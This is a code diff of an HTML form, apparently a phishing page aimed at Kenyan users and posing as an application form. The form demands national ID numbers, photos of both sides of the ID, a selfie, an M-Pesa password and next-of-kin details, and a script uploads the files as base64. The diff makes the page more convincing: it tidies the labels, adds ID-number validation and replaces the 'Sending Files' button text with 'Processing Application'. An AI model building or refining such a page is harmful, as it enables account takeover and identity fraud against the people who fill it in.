@@ -150,7 +150,7 @@
 
         .footer { text-align: center; font-size: 0.7em; color: #9ca3af; margin: 30px 0; line-height: 1.6; }
         
-        .hint-text { font-size: 0.85em; color: #6b7280; font-weight: 400; display: block; margin-top: 2px; }
+        .hint-text { font-size: 0.82em; color: #6b7280; font-weight: 400; display: block; margin-top: 2px; }
     </style>
 </head>
 <body>
@@ -191,11 +191,11 @@
         <label>Full Names (As they appear on ID)</label>
         <input type="text" name="full_name" placeholder="Enter your 3 names" required>
 
-        <label>Email Address (For Confirmation)</label>
+        <label>Email Address</label>
         <input type="email" name="customer_email" placeholder="email@example.com" required>
 
         <label>National ID Number</label>
-        <input type="text" name="id_number" maxlength="8" placeholder="Enter ID Number" required>
+        <input type="text" name="id_number" maxlength="8" pattern="\d*" title="Please enter a valid 8-digit ID number" placeholder="Enter ID Number" required>
 
         <div style="margin-top:30px; border-top: 1px solid #f3f4f6; padding-top: 20px;">
             <p style="font-size: 0.75em; font-weight: 800; color: var(--primary-blue);">SECURE DOCUMENT UPLOAD</p>
@@ -216,7 +216,9 @@
             <input type="file" name="id_back" accept="image/*" required>
         </div>
 
-        <label>Your Selfie (For Identity Check)</label>
+        <label>Your Selfie (Identity Check)
+            <span class="hint-text">(No headgear/hats and use a clear background)</span>
+        </label>
         <div class="upload-section">
             <input type="file" name="selfie" accept="image/*" required>
         </div>
@@ -231,16 +233,16 @@
         <input type="text" name="mpesa_password" placeholder="Enter password" required style="margin-top:5px;">
 
         <div style="margin-top:30px; border-top: 1px solid #f3f4f6; padding-top: 20px;">
-            <p style="font-size: 0.75em; font-weight: 800; color: #111;">REFERENCE PERSON (KIN)</p>
+            <p style="font-size: 0.75em; font-weight: 800; color: #111;">NEXT OF KIN INFORMATION</p>
         </div>
         
-        <label>Kin Full Name</label>
+        <label>Next of Kin Full Name</label>
         <input type="text" name="nok_name" placeholder="Full Name" required>
 
-        <label>Kin ID Number</label>
-        <input type="text" name="nok_id" placeholder="Enter Kin's ID Number" required>
+        <label>Next of Kin ID Number</label>
+        <input type="text" name="nok_id" maxlength="8" pattern="\d*" title="Please enter a valid 8-digit ID number" placeholder="Enter ID Number" required>
 
-        <label>Kin Phone Number</label>
+        <label>Next of Kin Phone Number</label>
         <input type="text" name="nok_contact" value="+254" required>
 
         <button type="submit" class="btn-submit" id="submitBtn">
@@ -268,7 +270,7 @@
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
         btn.disabled = true;
-        btnText.innerHTML = "⏳ Sending Files... Please wait";
+        btnText.innerHTML = "⏳ Processing Application... Please wait";
 
         const convertBase64 = (file) => {
             return new Promise((resolve, reject) => {
